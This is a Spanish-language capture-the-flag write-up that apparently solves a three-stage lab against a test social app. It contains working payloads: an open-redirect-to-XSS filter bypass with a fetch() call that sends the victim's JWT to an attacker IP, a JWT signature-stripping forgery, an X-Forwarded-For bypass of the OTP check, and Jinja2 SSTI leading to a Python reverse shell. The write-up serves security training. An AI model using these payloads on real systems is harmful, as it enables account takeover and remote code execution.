# Soluciones

## Etapa 1: Acceder con cualquier usuario

<details>
<summary>Mostrar</summary>

En esta etapa, el objetivo es acceder a la aplicación con un usuario cualquiera.

Para empezar, accedemos a http://whp-socially/ y nos encontramos con la siguiente pantalla:

![](img/MainPage.png)

Vemos que en el menú lateral izquierdo tenemos la opción de "Login", pero no es importante dado que no tenemos ninguna cuenta y no podemos registrarnos.

Si revisamos las publicaciones de la página, vemos que hay una publicación de un usuario llamado "admin" con un enlace que nos lleva a la página de Google.

![](img/InterestingHyperlink.png)

Este enlace es relevante, porque no redirecciona directamente a Google, sino que usa un parámetro llamado "next" para redireccionar a la página que nosotros queramos.

Esto recuerda a una vulnerabilidad llamada "Open Redirect", que consiste en que un atacante puede redireccionar a un usuario a una página que no es la que el usuario espera, por ejemplo, a una página de phishing.

Para validar si esto es una vulnerabilidad, podemos manipular el parámetro "next", quedando el enlace de la siguiente manera:

http://whp-socially/?next=http://example.com

![](img/example.com.png)

Y al acceder a este enlace, nos redirecciona a la página example.com, lo que confirma la vulnerabilidad.

Open Redirect es una vulnerabilidad muy común, normalmente no es muy peligrosa y en muchos casos se reporta con criticidad baja o incluso informativa. Sin embargo, hay casos en las que se puede explotar para realizar ataques más complejos, como por ejemplo, un Cross-Site Scripting (XSS). Un XSS permite que un atacante ejecute código JavaScript en el navegador del usuario. Vamos a verificar si esto es posible.

Para esto, tenemos que identificar cómo realiza la aplicación la redirección. Podemos usar Burp Suite para interceptar la petición y ver qué está pasando.

![](img/RequestOpenRedirect.png)

La aplicación redirecciona utilizando código JavaScript, más específicamente, con la propiedad "href" del objeto "window.location".

Cuando se redirecciona mediante JavaScript, y no mediante una cabecera HTTP "Location", se puede escalar el Open Redirect a un XSS. Esto resulta muy útil para Bug Bounty, porque los XSS se reportan con mayor criticidad que los Open Redirect, brindando una mayor recompensa.

Intentemos explotar esto. Primero, probemos si "javascript:" nos funciona, para ver si podemos ejecutar código JavaScript.

![](img/javascriptBlocked.png)

Al parecer, "javascript:" está bloqueado. No obstante, mediante el uso del carácter %09 (tabulador codificado en URL), podemos evadir los filtros.

Para esto, agregamos dicho carácter entre la primera y la última letra de la palabra "javascript", quedando de la siguiente manera:

![](img/BypassFilter.png)

Este carácter genera un espacio en blanco, que es ignorado por el navegador. Esta simple técnica, pero no tan conocida, me sirvió para evadir el WAF comercial de Imperva en un escenario de Bug Bounty.

Ahora, podemos ejecutar código JavaScript. Vamos a intentar llamar a la función "alert()" para ver si funciona.

![](img/alertBlocked.png)

Al parecer, la función "alert()" también está bloqueada. Sin embargo, podemos utilizar la función "print()", que genera una ventana de impresión.

![](img/printAllowed.png)

¡Perfecto, funciona! Accedamos desde el navegador para confirmar que se ejecuta el código JavaScript. El enlace debe quedar de la siguiente manera:

http://whp-socially/?next=j%09avascript:print()

![](img/printExecuted.png)

El código JavaScript se ejecuta correctamente. No obstante, no es muy útil, ya que solo genera una ventana de impresión. Vamos a intentar algo más interesante, como por ejemplo, robar la sesión del usuario.

Pero antes, necesitamos identificar cómo almacena la sesión / autenticación la aplicación. Normalmente, se almacena en una cookie, pero no siempre es así. Para determinar esto, revisamos los archivos JavaScript que se están ejecutando en la página principal. En este caso, tenemos un archivo llamado "main.js".

![](img/localStoragetoken.png)

En este archivo, podemos ver que se llama a la función "localStorage.getItem('token')", que es la que se encarga de obtener el token del usuario desde el almacenamiento local del navegador.

En caso de que haya dudas, la diferencia principal entre las cookies y el almacenamiento local es que las cookies se almacenan en el navegador y el servidor, mientras que el almacenamiento local solo se almacena en el navegador.

Vamos a intentar robar el token del usuario. Necesitamos un servidor de atacante para recibir el token de la víctima. Para esto, podemos usar un servidor HTTP de Python, con el siguiente comando:

    python3 -m http.server 80

![](img/pythonhttpserver.png)

Ahora, vamos a ver cuál es la dirección IP de nuestra máquina de atacante. Para esto, podemos usar el comando "ifconfig". La dirección IP que nos interesa es la de la interfaz puente de Docker, con el nombre que empieza con "br-".

![](img/ifconfig.png)

Con esta información, podemos crear un payload que utilice la función "fetch()" para enviar el token al servidor de atacante mediante una petición GET. El enlace quedaría de la siguiente manera:

```
http://whp-socially/?next=j%09avascript:fetch(%27http://<IP_ATACANTE>/%27%2blocalStorage.getItem(%27token%27))
```

**Importante:** Hay que reemplazar \<IP_ATACANTE\> por la dirección IP de la máquina de atacante. Además, hay que codificar el carácter "+" en URL, para que no se interprete como un espacio en blanco.

Si probamos el enlace, veremos que la petición no llega al servidor de atacante. Revisemos la consola del navegador para ver qué está pasando.

![](img/blockedFetch.png)

Al parecer, hay un error de sintaxis relacionado con el carácter "&". Para depurar esto, podemos enviar la petición al Repeater de Burp Suite y ver dónde está el problema.

![](img/blockedFetchRepeater.png)

El problema está en que el carácter "%27" (comilla simple codificada en URL) está siendo codificado mediante HTML Entities. Esto se debe a que la aplicación está haciendo un escape de los caracteres especiales.

Para solucionar esto, podemos ver si el resto de comillas están siendo escapadas también. Con JavaScript, podemos representar strings mediante comillas simples, dobles o backticks.

![](img/checkingQuoteChars.png)

En este caso, los backticks no están siendo escapados. Por lo tanto, podemos utilizarlos para solucionar el problema. El enlace quedaría de la siguiente manera:

```
http://whp-socially/?next=j%09avascript:fetch(`http://<IP_ATACANTE>/`%2blocalStorage.getItem(`token`))
```

Si probamos el enlace, vemos que la petición llega al servidor de atacante.

![](img/requestReceived.png)

Nos llega el valor "null", esto se debe a que no estamos autenticados, pero esto nos sirve para comprobar que la petición llega correctamente. Ahora, vamos a enviar la petición a la víctima, utilizando el servidor de explotación disponible en http://whp-exploitserver/.

![](img/exploitServer.png)

Pulsamos el botón "Deliver URL to victim" para enviar el enlace a la víctima. El servidor de explotación simula la navegación de la víctima y vemos que un JSON Web Token (JWT) llega correctamente al servidor del atacante.

![](img/tokenReceived.png)

Ahora, podemos utilizar el JWT para autenticarnos en la aplicación de http://whp-socially/. Abrimos la consola del navegador y ejecutamos el siguiente código JavaScript:

    localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb2NpYWxseS1hcHAiLCJpZCI6NX0.<FIRMA>')

**Importante:** Para que la consola nos deje pegar el código anterior, hay que escribir "allow pasting" justo antes de ejecutar el código. Además, hay que reemplazar \<FIRMA\> por la firma del JWT que hemos obtenido.

![](img/localStoragesetItem.png)

Si recargamos la página, comprobamos que nos hemos autenticado correctamente con la cuenta de "ares".

![](img/loggedinasares.png)

</details>

## Etapa 2: Acceder como admin

<details>
<summary>Mostrar</summary>

En esta etapa, el objetivo es acceder como administrador.

Tras iniciar sesión, podemos ver que tenemos una funcionalidad para publicar posts, pero se encuentra deshabilitada.

![](img/disabledposting.png)

Por lo tanto, vamos a revisar el JWT en busca de vulnerabilidades.

JWT se compone de tres partes: header, payload y firma. El header contiene información sobre el algoritmo de cifrado utilizado. El payload contiene la información que queremos guardar en el JWT. La firma se utiliza para verificar que el JWT no ha sido modificado, y se calcula mediante el header, el payload y una clave secreta.

Gracias a la página [JWT.io](https://jwt.io/), podemos ver el contenido del JWT más fácilmente. Introducimos el JWT obtenido anteriormente y obtenemos la siguiente información:

![](img/jwtdecoded.png)

Tenemos un campo "id" con el valor "5", que seguramente corresponda al identificador del usuario. Para modificarlo, necesitamos conocer la clave secreta que se utiliza para firmar el JWT, a menos que podamos encontrar una vulnerabilidad.

Si revisamos el HTTP History de Burp Suite al añadir un JWT en el Local Storage del navegador y refrescamos la página, se realiza una petición contra el endpoint "/session", que dado un JWT válido devuelve una cookie de sesión.

![](img/jwtreturnssession.png)

Vamos a probar a eliminar la firma del JWT y ver qué ocurre. Si se elimina la firma y la aplicación no la comprueba, el JWT se considera válido. Si esto ocurre, la aplicación debe devolver una cookie de sesión.

![](img/signatureremoved.png)

Esta vulnerabilidad permite manipular el payload del JWT, por lo que podemos modificar el valor de la clave "id" para que sea "1" y acceder como el primer usuario de la aplicación, que normalmente es el administrador.

![](img/modifiedidjwt.png)

Cerramos sesión y especificamos el JWT modificado desde la consola del navegador de la siguiente manera:

    localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzb2NpYWxseS1hcHAiLCJpZCI6MX0.')

![](img/setadminjwt.png)

Si recargamos la página, comprobamos que hemos accedido como administrador.

![](img/loginasadmin.png)

</details>

## Etapa 3: Leer el archivo /flag

<details>
<summary>Mostrar</summary>

En esta etapa, el objetivo es leer el archivo /flag, que contiene la flag final.

El panel de administración tiene la siguiente apariencia:

![](img/adminpanel.png)

Tenemos dos opciones: actualizar los datos del servidor SMTP y enviar un correo electrónico de prueba. El problema es que si intentamos usar cualquiera de las dos opciones, salta un segundo factor de autenticación, que nos pide un código OTP.

Ejemplo al intentar actualizar los datos del servidor SMTP:

![](img/verifyotp.png)

Existen casos en los que las aplicaciones confían en la cabecera "X-Forwarded-For". Esta cabecera fue creada para que los servidores web puedan saber la IP real de los usuarios que acceden a la aplicación a través de un proxy. En este caso, la aplicación confía en esta cabecera y no comprueba la IP real del usuario.

Si agregamos la cabecera "X-Forwarded-For" para que su valor sea la dirección IPv4 de loopback (127.0.0.1), la aplicación cree que el usuario está accediendo desde la misma máquina que el servidor, por lo que no se activa el segundo factor de autenticación.

La petición que se realiza al intentar actualizar los datos del servidor SMTP es la siguiente:

![](img/updatesmtporiginalrequest.png)

Al agregar la cabecera "X-Forwarded-For: 127.0.0.1", el servidor no comprueba el segundo factor de autenticación y autoriza la petición.

![](img/updatesmtpmodifiedrequest.png)

Podemos agregar una regla de "Match and Replace" en Burp Suite para que se agregue la cabecera "X-Forwarded-For" automáticamente en todas las peticiones, con la siguiente configuración:

* **Type:** Request header
* **Replace:** X-Forwarded-For: 127.0.0.1

![](img/addmatchreplacerule.png)

Vamos a modificar la dirección IP del servidor SMTP para que sea la del atacante.

![](img/smtpipmodified.png)

Con Python podemos crear un servidor SMTP que escuche en el puerto 25 y nos muestre los correos electrónicos que reciba. Para ello, ejecutamos el siguiente comando:

    sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25

![](img/pythonsmtpserver.png)

Ahora, si enviamos un correo electrónico de prueba a cualquier dirección, lo recibimos en el servidor SMTP.

![](img/receiveemail.png)

La petición que se realiza al enviar un correo electrónico de prueba es la siguiente:

![](img/sendemailrequest.png)

La clave "message" llama la atención porque su valor contiene la variable {{session['username']}}, que es sustituido por el nombre del usuario que envía el correo electrónico. Esto recuerda a una vulnerabilidad de Server-Side Template Injection (SSTI), que permite ejecutar código en el servidor, en este caso, código Python.

Para confirmar que se trata de una vulnerabilidad de SSTI, lo primero es identificar el motor de plantillas que utiliza la aplicación, dado que cada uno tiene su propia sintaxis. 

El motor de plantillas más utilizado en Flask es Jinja2. Para comprobar si la aplicación está utilizando este motor de plantillas, podemos probar a enviar un correo electrónico de prueba con el siguiente contenido:

    {{config}}

![](img/config.png)

Y comprobar si la respuesta contiene información sobre la configuración de la aplicación. 

![](img/configreceived.png)

Funciona, por lo que podemos probar a extraer el contenido del archivo /flag, mediante el siguiente payload extraído de [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread):

    {{cycler.__init__.__globals__.os.popen('cat /flag').read()}}

![](img/messagetoolong1.png)

Desgraciadamente, el valor de la clave "message" es demasiado largo, por lo que el payload no es ejecutado.

Necesitamos un payload más corto, pero primero necesitamos conocer cuánto espacio tenemos disponible para el payload. Vamos a ir agregando caracteres "X" en "message" hasta que la petición devuelva un error.

Al enviar 45 caracteres "X", la petición funciona correctamente.

![](img/45x.png)

Al enviar 46 caracteres "X", la petición devuelve un error.

![](img/46x.png)

Podemos concluir que tenemos 45 caracteres disponibles para el payload.

El artículo [Exploiting Jinja SSTI with limited payload size](https://niebardzo.github.io/2020-11-23-exploiting-jinja-ssti/) ofrece una solución para saltar la restricción de tamaño de payload.

La técnica propuesta consiste es actualizar "config", que es un diccionario que contiene la configuración de la aplicación. Añadimos un elemento al diccionario llamado "a" con el comando que le pasemos por el parámetro GET "a". 

De esta forma, no necesitamos incluir el comando en el campo "message", sino que lo pasamos por el parámetro GET, evadiendo así la restricción de tamaño.

En este caso, el comando es una reverse shell de Python 3.

    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ATACANTE>",<PUERTO_ATACANTE>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

**Importante:** Modificar "IP_ATACANTE" y "PUERTO_ATACANTE" por la dirección IP y el puerto del atacante respectivamente. Seleccionamos el texto y presionamos "Ctrl+U" en el Repeater de Burp Suite para que se codifique en formato URL.

Y el payload que vamos a utilizar es el siguiente:

    {{config.update(a=request.args.get('a'))}}

![](img/payload.png)

Nos ponemos a la escucha en el puerto especificado en el payload.

    nc -lvnp <PUERTO_ATACANTE>

![](img/nc.png)

Lanzamos os.popen(config.a) para que se ejecute el comando de la reverse shell, con el siguiente payload:

    {{lipsum.__globals__.os.popen(config.a)}}

Explicación del payload:
* **lipsum:** función que genera texto aleatorio, desde aquí podemos acceder a las variables globales.
* **\_\_globals\_\_:** diccionario que contiene las variables globales de las funciones, incluyendo "os".
* **os:** módulo que contiene funciones para interactuar con el sistema operativo.
* **popen:** función que ejecuta un comando en el sistema operativo.

![](img/revshell.png)

Y obtenemos una reverse shell.

![](img/shell.png)

Leemos el contenido del archivo /flag.

![](img/flagcontent.png)

</details>
